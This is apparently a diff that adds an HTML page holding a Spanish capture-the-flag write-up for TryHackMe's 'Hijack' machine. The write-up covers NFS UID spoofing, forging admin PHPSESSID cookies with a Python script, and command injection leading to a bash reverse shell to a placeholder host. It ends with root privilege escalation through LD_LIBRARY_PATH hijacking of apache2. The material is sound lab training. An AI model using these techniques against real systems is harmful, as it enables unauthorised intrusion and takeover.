@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Machine Hijack | MeloRZ</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../../css/style.css"/>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <nav class="navbar">
+    <div class="nav-brand"><span class="bracket">[</span><span class="brand-name">MeloRZ</span><span class="bracket">]</span></div>
+    <ul class="nav-links">
+      <li><a href="../../../index.html#writeups" class="nav-link">← Writeups</a></li>
+    </ul>
+    <div class="nav-status"><span class="status-dot"></span><span class="status-text">ONLINE</span></div>
+  </nav>
+  <div class="writeup-page">
+    <a href="../../../index.html" class="writeup-back">← Volver al portafolio</a>
+    <div class="writeup-header">
+      <div class="writeup-meta">
+        <span class="card-badge thm">THM</span>
+        <span class="card-difficulty easy">EASY</span>
+      </div>
+      <h1 class="writeup-title">Machine Hijack</h1>
+      <div class="writeup-info">
+        <span>Plataforma: <strong style="color:var(--blue-bright)">TryHackMe</strong></span>
+        <span>Tags: <span>Privesc</span><span>Linux</span></span>
+      </div>
+    </div>
+    <div class="writeup-body">
+
+
+<h1>Intrusión Inicial </h1>
+
+<hr>
+
+
+<h2>Enumeración de puertos</h2>
+
+
+<p>aplicamos el escaneo nmap : <code>namp -sS -p- --open --min-rate 5000 -Pn -n <IP> -oN nmap</code></p>
+
+<p>resultados:</p>
+
+<em>[imagen]</em>
+
+
+
+<hr>
+
+<p>Accedemos a la web y vemos que hay un panel de administración pero requiere que seamos admin.</p>
+
+
+<hr>
+
+<h2>Enumeración NFS  + FTP </h2>
+
+<h3>NFS</h3>
+
+<p>comando para enumerar shares en <strong>NFS</strong> : <code></code>showmount -e <IP-MACHINE></p>
+
+<p>resultado:</p>
+<em>[imagen]</em>
+
+<p>ahora vamos a montar ese share en nuestra maquina. comando : <code></code>sudo mount -t nfs <ip>:<path_share></p>
+
+<p>tratamos de acceder al dir pero no tenemos permisos , vemos que el usuario propietario tiene un UID de 1003 , por lo tanto creamos un user con ese mismo UID y ahora si nos deja entrar con ese user. Entramos y encontramos credenciales FTP.</p>
+
+<em>[imagen]</em>
+
+<h3>FTP </h3>
+
+<p>Con las credenciales ahora vamos a enumerar FTP</p>
+
+<p>Enumeramos y obtenemos dos archivos interesantes que con <code>get</code> descargamos a nuestra maquina</p>
+
+<em>[imagen]</em>
+<p>en el archivo de password vemos que es un conjunto de hashes con md5sum</p>
+
+<hr>
+
+
+<h2>Abuso del PHPSSESID</h2>
+
+<p>algo que podemos analizar en la web es el <strong>PHPSSESSID</strong> y vemos que parece ser una cadena base64.</p>
+
+<em>[imagen]</em>
+
+
+<p>hacemos una decodificacion del <strong>PHPSSESID</strong> y vemos lo siguiente</p>
+<em>[imagen]</em>
+<p>el <strong>PHPSSESID</strong> no es mas que <code>user:password_hasheada</code> <--- todo esto en base64</p>
+
+<p>Ahora podemos generar diferente <strong>PHPSSESID</strong> con las password hasheadas que encontramos antes, para eso hacemos uso del siguiente script:</p>
+
+<pre><code>#!/usr/bin/python3
+<p>import hashlib</p>
+<p>import base64</p>
+
+<h1>Open the file and read its lines</h1>
+<p>with open('hashes.txt', 'r') as f:</p>
+<p>lines = f.readlines()</p>
+
+<h1>Loop through the lines and modify each one</h1>
+<p>for line in lines:</p>
+    # Strip the line of bad characters
+<p>stripped_line = ''.join(filter(str.isalnum, line))</p>
+    # Hash the stripped line using MD5
+<p>hashed_line = hashlib.md5(stripped_line.encode('utf-8')).hexdigest()</p>
+    # Add "admin:" to the beginning of the hash
+<p>modified_hash = 'admin:' + hashed_line</p>
+    # Encode the modified hash to base64
+<p>encoded_hash = base64.b64encode(modified_hash.encode('utf-8'))</p>
+    # Print the encoded hash
+<p>print(encoded_hash.decode('ascii'))</code></pre></p>
+
+<em>[imagen]</em>
+<p>como resultado tenemos una lista de posibles PHPSSESID de admin, la cual vamos a fuzzear con <strong>wfuzz</strong></p>
+
+
+<hr>
+
+<h2>Fuzzing con Wfuzz </h2>
+
+<em>[imagen]</em>
+<p>probamos el <strong>PHPSSESID</strong> y ahora somos admin.</p>
+
+<em>[imagen]</em>
+
+
+
+<hr>
+
+
+<h2>Explotación Web</h2>
+
+<em>[imagen]</em>
+<p>vemos que el panel de admin nos permite poner un input para saber el estado de un servicio, suponemos que a nivel de codigo por detras se hace lo siguiente: <code>systemctl '$_POST['input']'</code></p>
+
+<p>Intentamos inyectar codigo y funciona con <code>&</code> por lo tanto lanzamos la reverse shell tipica:</p>
+
+<code></code>bash -c 'bash -i >& /dev/tpc/ip/puerto 0>&1' 
+<p>Ya tenemos la intrusión inicial , ahora a escalar privilegios</p>
+
+
+<hr>
+
+<h1>Escalada de privilegios </h1>
+
+<hr>
+
+<h2>Escalada Inicial</h2>
+
+<p>Enumerando los archivos de la web , obtenemos credenciales para rick en un archivo de configuración de una dbs</p>
+
+<em>[imagen]</em>
+
+<p>obtenemos la primera flag:</p>
+<em>[imagen]</em>
+
+
+<hr>
+
+<h2>PrivEsc a Root</h2>
+
+
+<h3>Enumeramos privilegios Sudoers de rick</h3>
+
+<em>[imagen]</em>
+<p>vemos que puede cambiar la variable de entorno <strong>LD_LIBRARY_PATH</strong> , lo cual es una vía de escalada de privilegios</p>
+
+<code>LD_LIBRARY_PATH</code> es una variable de entorno en sistemas Unix/Linux que especifica directorios donde el cargador dinámico de bibliotecas busca las bibliotecas compartidas (.so) antes de buscar en los directorios estándar del sistema.
+
+<p>tambien vemos que podemos ejecutar el binario de apache2 esta corriendo como root. Por lo tanto podemos aprovechar que podemos editar de donde se cargan las bibliotecas compartidas y hacer nuesta propia biblioteca maliciosa para apache2.</p>
+
+<hr>
+
+<h3>Listamos las bibliotecas compartidas que usa el binario apache2 </h3>
+
+
+<p>comando: <code>ldd /usr/sbin/apache2</code></p>
+
+<em>[imagen]</em>
+
+<hr>
+
+<h3>Creando biblioteca maliciosa</h3>
+
+<p>Ahora vamos a crear un archivo binario que pretenda ser una biblioteca de estas con su mismo nombre, en mi caso usare : <code>libcrypt.so.1</code></p>
+
+
+<p>Primero creamos el archivo <em>C</em> para luego compilarlo y convertirlo en un binario</p>
+<em>[imagen]</em>
+
+<p>>[!nota] Este archivo lo que hace es hacer una llamada al sistema ejecutando una bash como root</p>
+
+
+<p>ahora lo compilamos , comando: <code></code>gcc -o /tmp/libcrypt.so.1 -shared -fPIC malicious.c</p>
+
+<em>[imagen]</em>
+
+
+<hr>
+
+<h3>Ejecutamos el binario apache2 y obtenemos root</h3>
+
+<code>sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2</code>
+
+<em>[imagen]</em>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</body>
+</html>
